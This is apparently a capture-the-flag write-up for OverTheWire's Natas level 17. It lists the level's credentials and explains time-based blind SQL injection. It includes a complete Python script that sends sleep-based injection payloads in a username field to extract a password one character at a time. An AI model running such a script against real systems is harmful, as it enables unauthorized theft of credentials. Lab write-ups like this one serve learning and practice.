## Username
natas17

## Password
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

## Write-Up
<img width="596" height="173" alt="image" src="https://github.com/user-attachments/assets/c7e40e0a-5182-49ac-b848-1dd39f07f69f" />

I submit username 'test' for testing the logic.  
There was no output result.  
<img width="586" height="483" alt="image" src="https://github.com/user-attachments/assets/a96ec4ba-c1d8-41d8-b1eb-e0c5b671bd01" />

These strings that indicate whether user exists are blocked by a comment character.  
If there were no comment sign, we can get a password one by one for blind SQL Injection.  
This problem is about Fully Blind SQL Injection.  
In this situation, we can not see anything for text, so we should judge true or false for server response time using SLEEP() methods.  

```python
import requests #Easily HTTP Request
import string

#information to connect
url="http://natas17.natas.labs.overthewire.org/index.php"
username='natas17'
password='EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
auth=(username,password)

#Maintaining session
session=requests.Session()
session.auth=auth

final_password=""

#Making Alphabet + Numeric
charset=string.ascii_letters+string.digits

print('Start')

for i in range(1,33): #Password is 32 characters
    for char in charset:
        print(f"Current char = {char}")
        payload={'username': f'natas18" and BINARY substring(password,{i},1)= \'{char}\' and sleep(3) -- -'}

        #Sending data   
        res=session.post(url,data=payload)

        #Checking results
        print(res.elapsed.total_seconds())
        if res.elapsed.total_seconds()>3:
            final_password+=char
            print(final_password)
            break
            
print('End')
```
When we submit natas18" and sleep(10) and substring(~~~) , if this expression is true, the result screen is indicated after 3 seconds.  

## Method of solve
Blind SQL Injection
